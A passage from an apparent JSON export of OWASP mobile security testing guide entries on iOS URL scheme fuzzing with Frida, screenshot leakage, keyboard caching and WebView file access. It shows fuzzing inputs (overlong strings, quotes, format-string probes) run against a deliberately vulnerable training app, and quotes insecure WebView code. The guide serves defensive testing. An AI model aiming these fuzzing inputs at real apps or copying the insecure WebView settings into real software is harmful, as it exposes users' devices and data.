log(\"\\tnavigationController: \" + ObjC.Object(args[5]).toString());\n},\n</pre><p>The next time we run it, we see the following output:</p><pre>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -i \"*open*Url*\"\n    -m \"*[* *application*URL*]\" -m \"*[* openURL]\"\n\n  8144 ms  -[UIApplication _applicationOpenURLAction: 0x1c44ff900 payload: 0x10c5ee4c0 origin: 0x0]\n  8145 ms     | -[AppDelegate application: 0x105a59980 openURL: 0x1c46ebb80 options: 0x1c0e222c0]\n  8145 ms     |     application: &lt;Application: 0x105a59980&gt;\n  8145 ms     |     openURL: tg://resolve?domain=fridadotre\n  8145 ms     |     options :{\n                        UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n                        UIApplicationOpenURLOptionsSourceApplicationKey = \"com.apple.mobilesafari\";\n                    }\n  8269 ms     |    | TelegramUI.openExternalUrl(account, url, presentationData,\n                                        applicationContext, navigationController, dismissInput)\n  8269 ms     |    |    account: nil\n  8269 ms     |    |    url: tg://resolve?domain=fridadotre\n  8269 ms     |    |    presentationData: 0x1c4c51741\n  8269 ms     |    |    applicationContext: nil\n  8269 ms     |    |    navigationController: TelegramUI.PresentationData\n  8274 ms     | -[UIApplication applicationOpenURL:0x1c46ebb80]\n</pre><p>There you can observe the following:</p><ul><li>It calls application:openURL:options: from the app delegate as expected.</li><li>The source application is Safari (\"com.apple.mobilesafari\").</li><li>application:openURL:options: handles the URL but does not open it, it calls TelegramUI.openExternalUrl for that.</li><li>The URL being opened is tg://resolve?domain=fridadotre.</li><li>It uses the tg:// custom URL scheme from Telegram.</li></ul><p>It is interesting to see that if you navigate again to \"<a href=\"https://telegram.me/fridadotre\" rel=\"noopener noreferrer\" target=\"_blank\">https://telegram.me/fridadotre ↗</a>\", click on <strong>cancel</strong> and then click on the link offered by the page itself (\"Open in the Telegram app\"), instead of opening via custom URL scheme it will open via universal links.</p><p>You can try this while tracing both methods:</p><pre>$ frida-trace -U Telegram -m \"*[* *restorationHandler*]\" -m \"*[* *application*openURL*options*]\"\n\n// After clicking \"Open\" on the pop-up\n\n 16374 ms  -[AppDelegate application :0x10556b3c0 openURL :0x1c4ae0080 options :0x1c7a28400]\n 16374 ms   application :&lt;Application: 0x10556b3c0&gt;\n 16374 ms   openURL :tg://resolve?domain=fridadotre\n 16374 ms   options :{\n    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;\n    UIApplicationOpenURLOptionsSourceApplicationKey = \"com.apple.mobilesafari\";\n}\n\n// After clicking \"Cancel\" on the pop-up and \"OPEN\" in the page\n\n406575 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c063d0c0\n                restorationHandler:0x16f27a898]\n406575 ms  application:&lt;Application: 0x10556b3c0&gt;\n406575 ms  continueUserActivity:&lt;NSUserActivity: 0x1c063d0c0&gt;\n406575 ms       webpageURL:https://telegram.me/fridadotre\n406575 ms       activityType:NSUserActivityTypeBrowsingWeb\n406575 ms       userInfo:{\n}\n406575 ms  restorationHandler:&lt;__NSStackBlock__: 0x16f27a898&gt;\n</pre><p>Testing for Deprecated Methods</p><p>Search for deprecated methods like:</p><ul><li><a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622964-application?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">application:handleOpenURL: ↗</a></li><li><a href=\"https://developer.apple.com/documentation/uikit/uiapplication/1622961-openurl?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">openURL: ↗</a></li><li><a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application\" rel=\"noopener noreferrer\" target=\"_blank\">application:openURL:sourceApplication:annotation: ↗</a></li></ul><p>You may simply use frida-trace for this, to see if any of those methods are being used.</p><h3>Testing URL Schemes Source Validation</h3><p>A way to discard or confirm validation could be by hooking typical methods that might be used for that. For example <a href=\"https://developer.apple.com/documentation/foundation/nsstring/1407803-isequaltostring\" rel=\"noopener noreferrer\" target=\"_blank\">isEqualToString: ↗</a>:</p><pre>// - (BOOL)isEqualToString:(NSString *)aString;\n\nvar isEqualToString = ObjC.classes.NSString[\"- isEqualToString:\"];\n\nInterceptor.attach(isEqualToString.implementation, {\n  onEnter: function(args) {\n    var message = ObjC.Object(args[2]);\n    console.log(message)\n  }\n});\n</pre><p>If we apply this hook and call the URL scheme again:</p><pre>$ frida -U iGoat-Swift\n\n[iPhone::iGoat-Swift]-&gt; var isEqualToString = ObjC.classes.NSString[\"- isEqualToString:\"];\n\n                    Interceptor.attach(isEqualToString.implementation, {\n                      onEnter: function(args) {\n                        var message = ObjC.Object(args[2]);\n                        console.log(message)\n                      }\n                    });\n{}\n[iPhone::iGoat-Swift]-&gt; openURL(\"iGoat://?contactNumber=123456789&amp;message=hola\")\ntrue\nnil\n</pre><p>Nothing happens. This tells us already that this method is not being used for that as we cannot find any <em>app-package-looking</em> string like OWASP.iGoat-Swift or com.apple.mobilesafari between the hook and the text of the tweet. However, consider that we are just probing one method, the app might be using other approach for the comparison.</p><h3>Fuzzing URL Schemes</h3><p>If the app parses parts of the URL, you can also perform input fuzzing to detect memory corruption bugs.</p><p>What we have learned above can be now used to build your own fuzzer on the language of your choice, e.g. in Python and call the openURL using <a href=\"https://www.frida.re/docs/javascript-api/#rpc\" rel=\"noopener noreferrer\" target=\"_blank\">Frida's RPC ↗</a>. That fuzzer should do the following:</p><ul><li>Generate payloads.</li><li>For each of them call openURL.</li><li>Check if the app generates a crash report (.ips) in /private/var/mobile/Library/Logs/CrashReporter.</li></ul><p>The <a href=\"https://github.com/fuzzdb-project/fuzzdb\" rel=\"noopener noreferrer\" target=\"_blank\">FuzzDB ↗</a> project offers fuzzing dictionaries that you can use as payloads.</p><p>Using Frida<a href=\"https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0075/#using-frida_1\" rel=\"noopener noreferrer\" target=\"_blank\">¶</a></p><p>Doing this with Frida is pretty easy, as explained in this <a href=\"https://grepharder.github.io/blog/0x03_learning_about_universal_links_and_fuzzing_url_schemes_on_ios_with_frida.html\" rel=\"noopener noreferrer\" target=\"_blank\">blog post ↗</a> to see an example that fuzzes the <em><a href=\"https://mas.owasp.org/MASTG-APP-0028\" rel=\"noopener noreferrer\" target=\"_blank\"> iGoat-Swift</a></em> app (working on iOS 11.1.2).</p><p>Before running the fuzzer we need the URL schemes as inputs. From the static analysis we know that the iGoat-Swift app supports the following URL scheme and parameters: iGoat://?contactNumber={0}&amp;message={0}.</p><pre>$ frida -U SpringBoard -l ios-url-scheme-fuzzing.js\n[iPhone::SpringBoard]-&gt; fuzz(\"iGoat\", \"iGoat://?contactNumber={0}&amp;message={0}\")\nWatching for crashes from iGoat...\nNo logs were moved.\nOpened URL: iGoat://?contactNumber=0&amp;message=0\nOK!\nOpened URL: iGoat://?contactNumber=1&amp;message=1\nOK!\nOpened URL: iGoat://?contactNumber=-1&amp;message=-1\nOK!\nOpened URL: iGoat://?contactNumber=null&amp;message=null\nOK!\nOpened URL: iGoat://?contactNumber=nil&amp;message=nil\nOK!\nOpened URL: iGoat://?contactNumber=99999999999999999999999999999999999\n&amp;message=99999999999999999999999999999999999\nOK!\nOpened URL: iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n...\n&amp;message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n...\nOK!\nOpened URL: iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n...\n&amp;message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n...\nOK!\nOpened URL: iGoat://?contactNumber='&amp;message='\nOK!\nOpened URL: iGoat://?contactNumber=%20d&amp;message=%20d\nOK!\nOpened URL: iGoat://?contactNumber=%20n&amp;message=%20n\nOK!\nOpened URL: iGoat://?contactNumber=%20x&amp;message=%20x\nOK!\nOpened URL: iGoat://?contactNumber=%20s&amp;message=%20s\nOK!\n</pre><p>The script will detect if a crash occurred. On this run it did not detect any crashed but for other apps this could be the case. We would be able to inspect the crash reports in /private/var/mobile/Library/Logs/CrashReporter or in /tmp if it was moved by the script.</p>",
        "code": "MASTG-TEST-0075",
        "sort_order": 80
    },
    {
        "tags":
        [
            "MASTG-TEST-0059: Testing Auto-Generated Screenshots for Sensitive Information"
        ],
        "testcase": "Testing Auto-Generated Screenshots for Sensitive Information",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>If you have the source code, search for the <a href=\"https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622997-applicationdidenterbackground\" rel=\"noopener noreferrer\" target=\"_blank\">applicationDidEnterBackground ↗</a> method to determine whether the application sanitizes the screen before being backgrounded.</p><p>The following is a sample implementation using a default background image (overlayImage.png) whenever the application is backgrounded, overriding the current view:</p><p>Swift:</p><pre>private var backgroundImage: UIImageView?\n\nfunc applicationDidEnterBackground(_ application: UIApplication) {\n    let myBanner = UIImageView(image: #imageLiteral(resourceName: \"overlayImage\"))\n    myBanner.frame = UIScreen.main.bounds\n    backgroundImage = myBanner\n    window?.addSubview(myBanner)\n}\n\nfunc applicationWillEnterForeground(_ application: UIApplication) {\n    backgroundImage?.removeFromSuperview()\n}\n</pre><p>Objective-C:</p><pre>@property (UIImageView *)backgroundImage;\n\n- (void)applicationDidEnterBackground:(UIApplication *)application {\n    UIImageView *myBanner = [[UIImageView alloc] initWithImage:@\"overlayImage.png\"];\n    self.backgroundImage = myBanner;\n    self.backgroundImage.bounds = UIScreen.mainScreen.bounds;\n    [self.window addSubview:myBanner];\n}\n\n- (void)applicationWillEnterForeground:(UIApplication *)application {\n    [self.backgroundImage removeFromSuperview];\n}\n</pre><p>This sets the background image to overlayImage.png whenever the application is backgrounded. It prevents sensitive data leaks because overlayImage.png will always override the current view.</p><h2></h2><h2>Dynamic Analysis</h2><p>You can use a <em>visual approach</em> to quickly validate this test case using any iOS device (jailbroken or not):</p><ol><li>Navigate to an application screen that displays sensitive information, such as a username, an email address, or account details.</li><li>Background the application by hitting the <strong>Home</strong> button on your iOS device.</li><li>Verify that a default image is shown as the top view element instead of the view containing the sensitive information.</li></ol><p>If required, you may also collect evidence by performing steps 1 to 3 on a jailbroken device or a non-jailbroken device after repackaging the app with the Frida Gadget (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0090\" rel=\"noopener noreferrer\" target=\"_blank\"> Injecting Frida Gadget into an IPA Automatically</a></em>). After that, connect to the iOS device with SSH (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0052\" rel=\"noopener noreferrer\" target=\"_blank\"> Accessing the Device Shell</a></em>) or by other means (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0053\" rel=\"noopener noreferrer\" target=\"_blank\"> Host-Device Data Transfer</a></em>) and navigate to the Snapshots directory. The location may differ on each iOS version but it's usually inside the app's Library directory. For instance, on iOS 14.5 the Snapshots directory is located at:</p><pre>/var/mobile/Containers/Data/Application/$APP_ID/Library/SplashBoard/Snapshots/sceneID:$APP_NAME-default/\n</pre><p>The screenshots inside that folder should not contain any sensitive information.</p>",
        "code": "MASTG-TEST-0059",
        "sort_order": 75
    },
    {
        "tags":
        [
            "MASTG-TEST-0258: References to Keyboard Caching Attributes in UI Elements"
        ],
        "testcase": "References to Keyboard Caching Attributes in UI Elements",
        "details": "<h2>Overview</h2><p>This test verifies that the app appropriately configures text input fields to prevent the <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#keyboard-cache\" rel=\"noopener noreferrer\" target=\"_blank\">keyboard from caching</a> sensitive information, such as passwords or personal data.</p><p>Android apps can configure the behavior of text input fields using XML attributes in the layout files or programmatically in the code. If the app doesn't use <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#non-caching-input-types\" rel=\"noopener noreferrer\" target=\"_blank\">non-caching input types</a> for sensitive data, the keyboard may cache sensitive information.</p><h2></h2><h2>Steps</h2><ol><li>Reverse engineer the app (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0017\" rel=\"noopener noreferrer\" target=\"_blank\"> Decompiling Java Code</a></em>).</li><li>Search for XML attributes in the layout files within the res/layout directory.</li><li>Search for calls to the setInputType method and the input type values passed to it (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>).</li><li>In case the app uses Jetpack Compose, search for calls to <a href=\"https://developer.android.com/reference/kotlin/androidx/compose/foundation/text/KeyboardOptions#public-constructors_1\" rel=\"noopener noreferrer\" target=\"_blank\">KeyboardOptions constructors ↗</a> and their parameters in the reversed code (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0014\" rel=\"noopener noreferrer\" target=\"_blank\"> Static Analysis on Android</a></em>). Especially keyboardType and autoCorrect.</li></ol><h2></h2><h2>Observation</h2><p>The output should include:</p><ul><li>All android:inputType XML attributes, if using XML for the UI.</li><li>All calls to the setInputType method and the input type values passed to it.</li></ul><h2></h2><h2>Evaluation</h2><p>The test case fails if there are any fields handling sensitive data for which the app does not use <a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#keyboard-cache\" rel=\"noopener noreferrer\" target=\"_blank\">non-caching input types</a>.</p>",
        "code": "MASTG-TEST-0258",
        "sort_order": 72
    },
    {
        "tags":
        [
            "MASTG-TEST-0077: Testing WebView Protocol Handlers"
        ],
        "testcase": "Testing WebView Protocol Handlers",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><ul><li>Testing How WebViews Load Content</li><li>Testing WebView file access</li><li>Checking telephone number detection</li></ul><h3>Testing How WebViews Load Content</h3><p>If a WebView is loading content from the app data directory, users should not be able to change the filename or path from which the file is loaded, and they shouldn't be able to edit the loaded file.</p><p>This presents an issue especially in UIWebViews loading untrusted content via the deprecated methods <a href=\"https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">loadHTMLString:baseURL: ↗</a> or <a href=\"https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">loadData:MIMEType:textEncodingName:baseURL: ↗</a> and setting the baseURL parameter to nil or to a file: or applewebdata: URL schemes. In this case, in order to prevent unauthorized access to local files, the best option is to set it instead to about:blank. However, the recommendation is to avoid the use of UIWebViews and switch to WKWebViews instead.</p><p>Here's an example of a vulnerable UIWebView from <a href=\"https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/master/WheresMyBrowser/UIWebViewController.swift#L219\" rel=\"noopener noreferrer\" target=\"_blank\">\"Where's My Browser?\" ↗</a>:</p><pre>let scenario2HtmlPath = Bundle.main.url(forResource: \"web/UIWebView/scenario2.html\", withExtension: nil)\ndo {\n    let scenario2Html = try String(contentsOf: scenario2HtmlPath!, encoding: .utf8)\n    uiWebView.loadHTMLString(scenario2Html, baseURL: nil)\n} catch {}\n</pre><p>The page loads resources from the internet using HTTP, enabling a potential MITM to exfiltrate secrets contained in local files, e.g. in shared preferences.</p><p>When working with WKWebViews, Apple recommends using <a href=\"https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">loadHTMLString:baseURL: ↗</a> or <a href=\"https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">loadData:MIMEType:textEncodingName:baseURL: ↗</a> to load local HTML files and loadRequest: for web content. Typically, the local files are loaded in combination with methods including, among others: <a href=\"https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource\" rel=\"noopener noreferrer\" target=\"_blank\">pathForResource:ofType: ↗</a>, <a href=\"https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">URLForResource:withExtension: ↗</a> or <a href=\"https://developer.apple.com/documentation/swift/string/3126736-init\" rel=\"noopener noreferrer\" target=\"_blank\">init(contentsOf:encoding:) ↗</a>.</p><p>Search the source code for the mentioned methods and inspect their parameters.</p><p>Example in Objective-C:</p><pre>- (void)viewDidLoad\n{\n    [super viewDidLoad];\n    WKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];\n\n    self.webView = [[WKWebView alloc] initWithFrame:CGRectMake(10, 20,\n        CGRectGetWidth([UIScreen mainScreen].bounds) - 20,\n        CGRectGetHeight([UIScreen mainScreen].bounds) - 84) configuration:configuration];\n    self.webView.navigationDelegate = self;\n    [self.view addSubview:self.webView];\n\n    NSString *filePath = [[NSBundle mainBundle] pathForResource:@\"example_file\" ofType:@\"html\"];\n    NSString *html = [NSString stringWithContentsOfFile:filePath\n                                encoding:NSUTF8StringEncoding error:nil];\n    [self.webView loadHTMLString:html baseURL:[NSBundle mainBundle].resourceURL];\n}\n</pre><p>Example in Swift from <a href=\"https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/master/WheresMyBrowser/WKWebViewController.swift#L196\" rel=\"noopener noreferrer\" target=\"_blank\">\"Where's My Browser?\" ↗</a>:</p><pre>let scenario2HtmlPath = Bundle.main.url(forResource: \"web/WKWebView/scenario2.html\", withExtension: nil)\ndo {\n    let scenario2Html = try String(contentsOf: scenario2HtmlPath!, encoding: .utf8)\n    wkWebView.loadHTMLString(scenario2Html, baseURL: nil)\n} catch {}\n</pre><p>If only having the compiled binary, you can also search for these methods using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em>:</p><pre>$ rabin2 -zz ./WheresMyBrowser | grep -i \"loadHTMLString\"\n231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:\n</pre><p>In a case like this, it is recommended to perform dynamic analysis to ensure that this is in fact being used and from which kind of WebView. The baseURL parameter here doesn't present an issue as it will be set to \"null\" but could be an issue if not set properly when using a UIWebView. See \"Checking How WebViews are Loaded\" for an example about this.</p><p>In addition, you should also verify if the app is using the method <a href=\"https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">loadFileURL: allowingReadAccessToURL: ↗</a>. Its first parameter is URL and contains the URL to be loaded in the WebView, its second parameter allowingReadAccessToURL may contain a single file or a directory. If containing a single file, that file will be available to the WebView. However, if it contains a directory, all files on that directory will be made available to the WebView. Therefore, it is worth inspecting this and in case it is a directory, verifying that no sensitive data can be found inside it.</p><p>Example in Swift from <a href=\"https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/master/WheresMyBrowser/WKWebViewController.swift#L186\" rel=\"noopener noreferrer\" target=\"_blank\">\"Where's My Browser?\" ↗</a>:</p><pre>var scenario1Url = FileManager.default.urls(for: .libraryDirectory, in: .userDomainMask)[0]\nscenario1Url = scenario1Url.appendingPathComponent(\"WKWebView/scenario1.html\")\nwkWebView.loadFileURL(scenario1Url, allowingReadAccessTo: scenario1Url)\n</pre><p>In this case, the parameter allowingReadAccessToURL contains a single file \"WKWebView/scenario1.html\", meaning that the WebView has exclusively access to that file.</p><p>In the compiled binary you can use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em>:</p><pre>$ rabin2 -zz ./WheresMyBrowser | grep -i \"loadFileURL\"\n237 0x0002dff1 37 (4.__TEXT.__objc_methname) ascii loadFileURL:allowingReadAccessToURL:\n</pre><h3>Testing WebView File Access</h3><p>If you have found a UIWebView being used, then the following applies:</p><ul><li>The file:// scheme is always enabled.</li><li>File access from file:// URLs is always enabled.</li><li>Universal access from file:// URLs is always enabled.</li></ul><p>Regarding WKWebViews:</p><ul><li>The file:// scheme is also always enabled and it <strong>cannot be disabled</strong>.</li><li>It disables file access from file:// URLs by default but it can be enabled.</li></ul><p>The following WebView properties can be used to configure file access:</p><ul><li>allowFileAccessFromFileURLs (WKPreferences, false by default): it enables JavaScript running in the context of a file:// scheme URL to access content from other file:// scheme URLs.</li><li>allowUniversalAccessFromFileURLs (WKWebViewConfiguration, false by default): it enables JavaScript running in the context of a file:// scheme URL to access content from any origin.</li></ul><p>For example, it is possible to set the <strong><a href=\"https://github.com/WebKit/webkit/blob/master/Source/WebKit/UIProcess/API/Cocoa/WKPreferences.mm#L470\" rel=\"noopener noreferrer\" target=\"_blank\">undocumented property ↗</a></strong> allowFileAccessFromFileURLs by doing this:</p><p>Objective-C:</p><pre>[webView.configuration.preferences setValue:@YES forKey:@\"allowFileAccessFromFileURLs\"];\n</pre><p>Swift:</p><pre>webView.configuration.preferences.setValue(true, forKey: \"allowFileAccessFromFileURLs\")\n</pre><p>If one or more of the above properties are activated, you should determine whether they are really necessary for the app to work properly.</p><h3>Checking Telephone Number Detection</h3><p>In Safari on iOS, telephone number detection is on by default. However, you might want to turn it off if your HTML page contains numbers that can be interpreted as phone numbers, but are not phone numbers, or to prevent the DOM document from being modified when parsed by the browser. To turn off telephone number detection in Safari on iOS, use the format-detection meta tag (&lt;meta name = \"format-detection\" content = \"telephone=no\"&gt;). An example of this can be found in the <a href=\"https://developer.apple.com/library/archive/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html#//apple_ref/doc/uid/TP40007899-CH6-SW2\" rel=\"noopener noreferrer\" target=\"_blank\">Apple developer documentation ↗</a>. Phone links should be then used (e.g. &lt;a href=\"tel:1-408-555-5555\"&gt;1-408-555-5555&lt;/a&gt;) to explicitly create a link.</p><h2></h2><h2>Dynamic Analysis</h2><p>If it's possible to load local files via a WebView, the app might be vulnerable to directory traversal attacks. This would allow access to all files within the sandbox or even to escape the sandbox with full access to the file system (if the device is jailbroken). It should therefore be verified if a user can change the filename or path from which the file is loaded, and they shouldn't be able to edit the loaded file.</p><p>To simulate an attack, you may inject your own JavaScript into the WebView with an interception proxy or simply by using dynamic instrumentation. Attempt to access local storage and any native methods and properties that might be exposed to the JavaScript context.</p><p>In a real-world scenario, JavaScript can only be injected through a permanent backend Cross-Site Scripting vulnerability or a MITM attack. See the OWASP <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\" rel=\"noopener noreferrer\" target=\"_blank\">XSS Prevention Cheat Sheet ↗</a> and the chapter \"<a href=\"https://mas.owasp.org/MASTG/0x06g-Testing-Network-Communication/\" rel=\"noopener noreferrer\" target=\"_blank\">iOS Network Communication</a>\" for more information.</p><p>For what concerns this section we will learn about:</p><ul><li>Testing How WebViews Load Content</li><li>Determining WebView file access</li></ul><h3>Testing How WebViews Load Content</h3><p>If WKWebView's \"scenario 2\" of the <a href=\"https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/master/WheresMyBrowser/WKWebViewController.swift#L196\" rel=\"noopener noreferrer\" target=\"_blank\">\"Where's My Browser?\" ↗</a> app is loaded, the app will do so by calling <a href=\"https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc\" rel=\"noopener noreferrer\" target=\"_blank\">URLForResource:withExtension: ↗</a> and loadHTMLString:baseURL.</p><p>To quickly inspect this, you can use frida-trace and trace all loadHTMLString and URLForResource:withExtension: methods.</p><pre>$ frida-trace -U \"Where's My Browser?\"\n    -m \"*[WKWebView *loadHTMLString*]\" -m \"*[* URLForResource:withExtension:]\"\n\n 14131 ms  -[NSBundle URLForResource:0x1c0255390 withExtension:0x0]\n 14131 ms  URLForResource: web/WKWebView/scenario2.html\n 14131 ms  withExtension: 0x0\n 14190 ms  -[WKWebView loadHTMLString:0x1c0255390 baseURL:0x0]\n 14190 ms   HTMLString: &lt;!DOCTYPE html&gt;\n    &lt;html&gt;\n        ...\n        &lt;/html&gt;\n\n 14190 ms  baseURL: nil\n</pre><p>In this case, baseURL is set to nil, meaning that the effective origin is \"null\". You can obtain the effective origin by running window.origin from the JavaScript of the page (this app has an exploitation helper that allows to write and run JavaScript, but you could also implement a MITM or simply use Frida to inject JavaScript, e.g. via evaluateJavaScript:completionHandler of WKWebView).</p><p>As an additional note regarding UIWebViews, if you retrieve the effective origin from a UIWebView where baseURL is also set to nil you will see that it is not set to \"null\", instead you'll obtain something similar to the following:</p><pre>applewebdata://5361016c-f4a0-4305-816b-65411fc1d780\n</pre><p>This origin \"applewebdata://\" is similar to the \"file://\" origin as it does not implement Same-Origin Policy and allow access to local files and any web resources. In this case, it would be better to set baseURL to \"about:blank\", this way, the Same-Origin Policy would prevent cross-origin access. However, the recommendation here is to completely avoid using UIWebViews and go for WKWebViews instead.</p><h3>Determining WebView File Access</h3><p>Even if not having the original source code, you can quickly determine if the app's WebViews do allow file access and which kind. For this, simply navigate to the target WebView in the app and inspect all its instances, for each of them get the values mentioned in the static analysis, that is, allowFileAccessFromFileURLs and allowUniversalAccessFromFileURLs. This only applies to WKWebViews (UIWebVIews always allow file access).</p><p>We continue with our example using the <a href=\"https://github.com/authenticationfailure/WheresMyBrowser.iOS/\" rel=\"noopener noreferrer\" target=\"_blank\">\"Where's My Browser?\" ↗</a> app and Frida REPL, extend the script with the following content:</p><pre>ObjC.choose(ObjC.classes['WKWebView'], {\n  onMatch: function (wk) {\n    console.log('onMatch: ', wk);\n    console.log('URL: ', wk.URL().toString());\n    console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());\n    console.log('allowFileAccessFromFileURLs: ',\n            wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());\n    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());\n    console.log('allowUniversalAccessFromFileURLs: ',\n            wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());\n  },\n  onComplete: function () {\n    console.log('done for WKWebView!');\n  }\n});\n</pre><p>If you run it now, you'll have all the information you need:</p><pre>$ frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n\nonMatch:  &lt;WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = &lt;CALayer: 0x1c4238f20&gt;&gt;\nURL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/\n        Library/WKWebView/scenario1.html\njavaScriptEnabled:  true\nallowFileAccessFromFileURLs:  0\nhasOnlySecureContent:  false\nallowUniversalAccessFromFileURLs:  0\n</pre><p>Both allowFileAccessFromFileURLs and allowUniversalAccessFromFileURLs are set to \"0\", meaning that they are disabled. In this app we can go to the WebView configuration and enable allowFileAccessFromFileURLs. If we do so and re-run the script we will see how it is set to \"1\" this time:</p><pre>$ frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js\n...\n\nallowFileAccessFromFileURLs:  1\n</pre>",
        "code": "MASTG-TEST-0077",
        "sort_order": 82
    },
    {
        "tags":
        [
            "MASTG-TEST-0025: Testing for Injection Flaws"
        ],
        "testcase": "Testing for Injection Flaws",
